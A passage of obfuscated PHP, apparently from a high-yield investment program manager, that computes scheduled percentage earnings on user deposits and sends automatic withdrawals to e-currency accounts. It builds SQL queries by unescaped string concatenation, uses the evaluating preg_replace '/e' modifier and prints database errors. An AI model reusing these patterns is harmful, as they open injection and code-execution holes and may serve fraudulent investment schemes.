    $elnlcMdano = preg_replace ('/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\'))', $elnlcMdano);
    $elnlcMdano = preg_replace ('/([	 ])
/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\')).\'
\'', $elnlcMdano);
    $elnlcMdano = elnlcxswc ($elnlcMdano, 74, true);
    return $elnlcMdano;
  }

  function elnlcxswc ($elnlcyoeFz, $elnlcwpUI, $elnlciFdI = false)
  {
    global $elnlchyuw;
    $elnlcHvEKf = ($elnlciFdI ? sprintf (' =%s', '
') : '
');
    $elnlcyoeFz = elnlcocdo ($elnlcyoeFz);
    if (substr ($elnlcyoeFz, -1) == '
')
    {
      $elnlcyoeFz = substr ($elnlcyoeFz, 0, -1);
    }

    $elnlcNphRk = explode ('
', $elnlcyoeFz);
    $elnlcyoeFz = '';
    for ($i = 0; $i < count ($elnlcNphRk); ++$i)
    {
      $elnlcOjqL = explode (' ', $elnlcNphRk[$i]);
      $elnlcqNpgJ = '';
      for ($e = $elnlchyuw['elnlcRjwtU']; $e < count ($elnlcOjqL); ++$e)
      {
        $elnlcgcOy = $elnlcOjqL[$e];
        if (($elnlciFdI AND $elnlcwpUI < strlen ($elnlcgcOy)))
        {
          $elnlcBDjA = $elnlcwpUI - strlen ($elnlcqNpgJ) - 1;
          if ($e != 0)
          {
            if (20 < $elnlcBDjA)
            {
              $elnlcwFya = $elnlcBDjA;
              if (substr ($elnlcgcOy, $elnlcwFya - 1, 1) == '=')
              {
                --$elnlcwFya;
              }
              else
              {
                if (substr ($elnlcgcOy, $elnlcwFya - 2, 1) == '=')
                {
                  $elnlcwFya -= 2;
                }
              }

              $elnlcduBc = substr ($elnlcgcOy, 0, $elnlcwFya);
              $elnlcgcOy = substr ($elnlcgcOy, $elnlcwFya);
              $elnlcqNpgJ .= ' ' . $elnlcduBc;
              $elnlcyoeFz .= $elnlcqNpgJ . sprintf ('=%s', '
');
            }
            else
            {
              $elnlcyoeFz .= $elnlcqNpgJ . $elnlcHvEKf;
            }

            $elnlcqNpgJ = '';
          }

          while (0 < strlen ($elnlcgcOy))
          {
            $elnlcwFya = $elnlcwpUI;
            if (substr ($elnlcgcOy, $elnlcwFya - 1, 1) == '=')
            {
              --$elnlcwFya;
            }
            else
            {
              if (substr ($elnlcgcOy, $elnlcwFya - 2, 1) == '=')
              {
                $elnlcwFya -= 2;
              }
            }

            $elnlcduBc = substr ($elnlcgcOy, 0, $elnlcwFya);
            $elnlcgcOy = substr ($elnlcgcOy, $elnlcwFya);
            if (0 < strlen ($elnlcgcOy))
            {
              $elnlcyoeFz .= $elnlcduBc . sprintf ('=%s', '
');
              continue;
            }
            else
            {
              $elnlcqNpgJ = $elnlcduBc;
              continue;
            }
          }

          continue;
        }

        $elnlcfwUpk = $elnlcqNpgJ;
        $elnlcqNpgJ .= ($e == 0 ? $elnlcgcOy : ' ' . $elnlcgcOy);
        if (($elnlcwpUI < strlen ($elnlcqNpgJ) AND $elnlcfwUpk != ''))
        {
          $elnlcyoeFz .= $elnlcfwUpk . $elnlcHvEKf;
          $elnlcqNpgJ = $elnlcgcOy;
          continue;
        }
      }

      $elnlcyoeFz .= $elnlcqNpgJ . '
';
    }

    return $elnlcyoeFz;
  }

  function elnlclmdm ($elnlcboRn = '100%')
  {
    return '' . '
<table cellspacing=0 cellpadding=1 border=0 width=' . $elnlcboRn . ' bgcolor=#FF8D00>
<tr><td bgcolor=#FF8D00>
<table cellspacing=0 cellpadding=0 border=0 width=100%>
<tr>
<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>
<td valign=top bgcolor=#FFFFF2 style=\'padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;\'>
';
  }

  function elnlcsakwg ()
  {
    return '</td></tr></table></td></tr></table>';
  }

  function elnlctygcv ($elnlcphuj, $elnlcLiht, $elnlcSTPT)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return null;
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcjOHcQ']] == 1)
    {
      $q = '' . 'select * from hm2_deposits where id = ' . $elnlcphuj;
      ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
      $elnlcHSOJ = mysql_fetch_array ($elnlcTpvVW);
      if (!$elnlcbzJNF[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]][$elnlchyuw['elnlcWDws']])
      {
        return null;
      }

      $q = 'select * from hm2_users where id = ' . $elnlcHSOJ[$elnlchyuw['elnlciorSe']];
      ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
      $elnlcmiFKI = mysql_fetch_array ($elnlcTpvVW);
      if (($elnlcmiFKI[$elnlchyuw['elnlcblDF']] != 1 OR $elnlcmiFKI[$elnlchyuw['elnlcdLtHP']] != 1))
      {
        return null;
      }

      if (0 < $elnlcTcyic[$elnlchyuw['elnlcUTsFV']])
      {
        $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
        ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
        $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
        if (0 < $elnlcgVDB[$elnlchyuw['elnlczqBjw']])
        {
          if ($elnlcTcyic[$elnlchyuw['elnlcUTsFV']] <= ($elnlcgVDB[$elnlchyuw['elnlcVMTs']] + $elnlcLiht) * 100 / $elnlcgVDB[$elnlchyuw['elnlczqBjw']])
          {
            return null;
          }
        }
      }

      $elnlcuUlIg = unserialize ($elnlcmiFKI[$elnlchyuw['elnlcLSzq']]);
      $elnlcLiht = abs ($elnlcLiht);
      $elnlcwlDFL = floor ($elnlcLiht * $elnlcTcyic[$elnlchyuw['elnlclGSvU']]) / 100;
      if ($elnlcwlDFL < $elnlcTcyic[$elnlchyuw['elnlczAydl']])
      {
        $elnlcwlDFL = $elnlcTcyic[$elnlchyuw['elnlczAydl']];
      }

      $elnlcgeMH = $elnlcLiht - $elnlcwlDFL;
      if ($elnlcgeMH < 0)
      {
        $elnlcgeMH = $elnlchyuw['elnlcRjwtU'];
      }

      $elnlcgeMH = sprintf ('%.02f', floor ($elnlcgeMH * 100) / 100);
      if ($elnlcTcyic[$elnlchyuw['elnlcQTiaN']] != '')
      {
        $elnlchudQ = '' . 'Earning from deposit $' . $elnlcHSOJ[$elnlchyuw['elnlcCNVKJ']] . '. Auto withdraw to ' . $elnlcmiFKI[$elnlchyuw['elnlcEzHQ']] . ' from ' . $elnlcTcyic[$elnlchyuw['elnlcLdvMV']];
      }
      else
      {
        $elnlchudQ = $elnlcTcyic[$elnlchyuw['elnlcQTiaN']];
      }

      $elnlcuduiM = '' . 'Auto-withdrawal error, tried to send ' . $elnlcgeMH . ' earning to ' . $elnlcbzJNF[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]][$elnlchyuw['elnlcvbiD']] . ' account # ' . $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]] . '. Error:';
      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 0)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcltil ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 1)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcqouj ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 2)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcawary ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 5)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcmdpy ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 8)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcuhqaw ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 9)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcsvulm ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 15)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcnovw ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 16)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcvwrkl ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 17)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcrjie ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 18)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcwbed ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcHSOJ[$elnlchyuw['elnlcmhRT']] == 24)
      {
        list ($elnlcfQsDQ, $elnlcrEgH, $elnlcdiuI) = elnlcrdrpp ('', $elnlcgeMH, $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]], $elnlchudQ, $elnlcuduiM);
      }

      if ($elnlcfQsDQ == 1)
      {
        $q = 'insert into hm2_history set
            user_id = ' . $elnlcmiFKI[$elnlchyuw['elnlclRBWS']] . ('' . ',
        		amount = -' . $elnlcLiht . ',
            		actual_amount = -' . $elnlcLiht . ',
        		type=\'withdrawal\',
            		' . $elnlcSTPT . ',
			ec = ') . $elnlcHSOJ[$elnlchyuw['elnlcmhRT']] . ',
        		description = \'Auto-withdrawal earning to account ' . $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]] . ('' . '. Batch is ' . $elnlcdiuI . '\'');
        (mysql_query ($q) OR print mysql_error ());
        $elnlcfOud = array ();
        $elnlcfOud[$elnlchyuw['elnlcEzHQ']] = $elnlcmiFKI[$elnlchyuw['elnlcEzHQ']];
        $elnlcfOud[$elnlchyuw['elnlcvbiD']] = $elnlcmiFKI[$elnlchyuw['elnlcvbiD']];
        $elnlcfOud[$elnlchyuw['elnlcGsrCm']] = $elnlcLiht;
        $elnlcfOud[$elnlchyuw['elnlcDPJw']] = $elnlcdiuI;
        $elnlcfOud[$elnlchyuw['elnlcVmHJ']] = $elnlcuUlIg[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]];
        $elnlcfOud[$elnlchyuw['elnlczDWj']] = $elnlcbzJNF[$elnlcHSOJ[$elnlchyuw['elnlcmhRT']]][$elnlchyuw['elnlcvbiD']];
        elnlcqkpc ('withdraw_user_notification', $elnlcmiFKI[$elnlchyuw['elnlcOnCG']], $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcfOud);
        elnlcqkpc ('withdraw_admin_notification', $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcfOud);
      }
    }

  }

  function elnlcrkrwy ($elnlcgRoE)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    $elnlcQAUMy = array ();
    if (($elnlcTcyic[$elnlchyuw['elnlceOAv']] == 1 AND $elnlcgRoE != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlckLNre']]][$elnlcgVDB[$elnlchyuw['elnlclRBWS']]] = $elnlcgVDB;
    }

    $elnlccSkk = $elnlchyuw['elnlchcRPc'];
    $elnlcdxRaC = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcgRoE == -1)
    {
      $elnlcdxRaC = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcgRoE . ' and status = \'on\'';
    }

    if ($elnlcgRoE == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcubIy = mysql_query ($q) OR print mysql_error ());
    while ($elnlcnnAak = mysql_fetch_array ($elnlcubIy))
    {
      $elnlcqnMW = $elnlcnnAak[$elnlchyuw['elnlclRBWS']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcqnMW;
      (mysql_query ($q) OR print mysql_error ());
      $elnlccSkk = $elnlchyuw['elnlchcRPc'];
      $elnlcduUdl = ' ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ';
      while (0 < $elnlccSkk)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit,
              ' . $elnlcduUdl . ' as q_days1
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcqnMW . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((' . $elnlcduUdl . ' + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or ' . $elnlcduUdl . ' = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((' . $elnlcduUdl . ' = 0) or 
                (               
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval ' . $elnlcduUdl . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (' . $elnlcduUdl . ' > 0 and t.period = \'end\') 
              ))';
        ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
        $elnlccSkk = $elnlchyuw['elnlcRjwtU'];
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          ++$elnlccSkk;
          if (!isset ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]))
          {
            continue;
          }

          $elnlcjtAF = $elnlchyuw['elnlcRjwtU'];
          $elnlcormLb = $elnlchyuw['elnlcRjwtU'];
          reset ($elnlcQAUMy);
          reset ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]);
          while (list ($elnlcuNse, $elnlckWdOt) = each ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]))
          {
            if (($elnlckWdOt[$elnlchyuw['elnlcroIG']] <= $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] AND ($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] <= $elnlckWdOt[$elnlchyuw['elnlcHcrf']] OR $elnlckWdOt[$elnlchyuw['elnlcHcrf']] == 0)))
            {
              $elnlcjtAF = $elnlckWdOt[$elnlchyuw['elnlchJOG']];
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] < $elnlckWdOt[$elnlchyuw['elnlcroIG']] AND $elnlcjtAF == 0))
            {
              $elnlcjtAF = $elnlcormLb;
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] < $elnlckWdOt[$elnlchyuw['elnlcroIG']] AND 0 < $elnlcjtAF))
            {
              break;
            }

            $elnlcormLb = $elnlckWdOt[$elnlchyuw['elnlchJOG']];
          }

          if (($elnlckWdOt[$elnlchyuw['elnlcHcrf']] != 0 AND $elnlckWdOt[$elnlchyuw['elnlcHcrf']] < $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']]))
          {
            $elnlcjtAF = $elnlcormLb;
          }

          $elnlcGHPa = $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] * $elnlcjtAF / 100;
          $elnlcqaPE = '';
          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcqoGF'])
          {
            $elnlcqaPE = ' 1 day ';
          }
          else
          {
            if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'])
            {
              $elnlcqaPE = ' 1 hour ';
            }
            else
            {
              if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcEVvN'])
              {
                $elnlcqaPE = ' 7 day ';
              }
              else
              {
                if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == 'b-w')
                {
                  $elnlcqaPE = ' 14 day ';
                }
                else
                {
                  if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlctcSD'])
                  {
                    $elnlcqaPE = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcFzMrx'])
                    {
                      $elnlcqaPE = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcnBKly'])
                      {
                        $elnlcqaPE = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcuOjHR'])
                        {
                          $elnlcqaPE = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcfRnSo'])
                          {
                            $elnlcqaPE = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlconHe'])
                            {
                              $elnlcqaPE = ' ' . $elnlcgVDB[$elnlchyuw['elnlcjawPm']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcjtAF == 0 AND $elnlcqaPE == ''))
          {
            continue;
          }

          $elnlcUWNOd = -1;
          $q = 'select weekday(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ') as dw');
          ($elnlcmzhES = mysql_query ($q) OR print mysql_error ());
          while ($elnlcdruD = mysql_fetch_array ($elnlcmzhES))
          {
            $elnlcUWNOd = $elnlcdruD[$elnlchyuw['elnlcWWFTf']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? ' date_format(date, \'%Y-%m-%d %H\') = date_format(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ', \'%Y-%m-%d %H\') and') : 'to_days(date) = to_days(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ') and ')) . ' deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
          ($elnlcOqBH = mysql_query ($q) OR print mysql_error ());
          $elnlcwUyle = $elnlchyuw['elnlcRjwtU'];
          while ($elnlcsOvF = mysql_fetch_array ($elnlcOqBH))
          {
            $elnlcwUyle = $elnlcsOvF[$elnlchyuw['elnlchGQKt']];
          }

          if ($elnlcwUyle == 0)
          {
            if ((5 <= $elnlcUWNOd AND $elnlcgVDB[$elnlchyuw['elnlcRlQE']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcUWNOd == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                    amount = ' . $elnlcGHPa . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcTcyic[$elnlchyuw['elnlcrihr']] . number_format ($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']], 2) . ('' . ' - ' . $elnlcjtAF . ' %\',
                    actual_amount = ' . $elnlcGHPa . ',
                    date = \'') . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
            }

            (mysql_query ($q) OR print mysql_error ());
          }

          $elnlcMsNcL = '';
          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlconHe'])
          {
            if (($elnlcgVDB[$elnlchyuw['elnlcNRnay']] == 0 OR ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] AND $elnlcgVDB[$elnlchyuw['elnlcQIUK']])))
            {
              $elnlcMsNcL = ', status = \'off\'';
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcybqr']] == 1 AND ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] == 0 OR ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] AND $elnlcgVDB[$elnlchyuw['elnlcQIUK']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
                    amount = ' . $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] . ',
                    ec = ' . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    deposit_id = ') . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcUWNOd AND $elnlcgVDB[$elnlchyuw['elnlcRlQE']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcgVDB[$elnlchyuw['elnlcStyIm']] AND $elnlcgVDB[$elnlchyuw['elnlcStyIm']] <= 100) AND $elnlcgVDB[$elnlchyuw['elnlcFhrHQ']] == 1))
              {
                if ($elnlcgVDB[$elnlchyuw['elnlcsWIGP']] == 0)
                {
                  $elnlcgVDB[$elnlchyuw['elnlcsWIGP']] = $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] + 1;
                }

                if (($elnlcgVDB[$elnlchyuw['elnlcNsiAD']] <= $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] AND $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] <= $elnlcgVDB[$elnlchyuw['elnlcsWIGP']]))
                {
                  if ($elnlcgVDB[$elnlchyuw['elnlcQSjJt']] == 1)
                  {
                    $elnlcpqAJt = preg_split ('/\\s*,\\s*/', $elnlcgVDB[$elnlchyuw['elnlclUSEx']]);
                    if (!in_array ($elnlcgVDB[$elnlchyuw['elnlcStyIm']], $elnlcpqAJt))
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcpqAJt[0];
                    }
                  }
                  else
                  {
                    if ($elnlcgVDB[$elnlchyuw['elnlcStyIm']] < $elnlcgVDB[$elnlchyuw['elnlcWDayO']])
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcgVDB[$elnlchyuw['elnlcWDayO']];
                    }

                    if ($elnlcgVDB[$elnlchyuw['elnlclTMy']] < $elnlcgVDB[$elnlchyuw['elnlcStyIm']])
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcgVDB[$elnlchyuw['elnlclTMy']];
                    }
                  }
                }
                else
                {
                  $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlchyuw['elnlcRjwtU'];
                }

                if ((0 < $elnlcgVDB[$elnlchyuw['elnlcStyIm']] AND $elnlcgVDB[$elnlchyuw['elnlcStyIm']] <= 100))
                {
                  $elnlcVdjzK = $elnlcGHPa * $elnlcgVDB[$elnlchyuw['elnlcStyIm']] / 100;
                  $elnlcGHPa = floor ((floor ($elnlcGHPa * 100000) / 100000 - floor ($elnlcVdjzK * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                        amount = -' . $elnlcVdjzK . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcVdjzK . ',
                    		ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    		date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                                deposit_id = ') . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcVdjzK . ',
                    		actual_amount = actual_amount + ' . $elnlcVdjzK . '
                    		where id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlctygcv ($elnlcgVDB[$elnlchyuw['elnlclRBWS']], $elnlcGHPa, 'date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcqaPE . ' ' . $elnlcMsNcL . ' where id =' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcTpvVW = mysql_query ($q);
      while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
      {
        if ($elnlcgVDB[$elnlchyuw['elnlcRlQE']] == 1)
        {
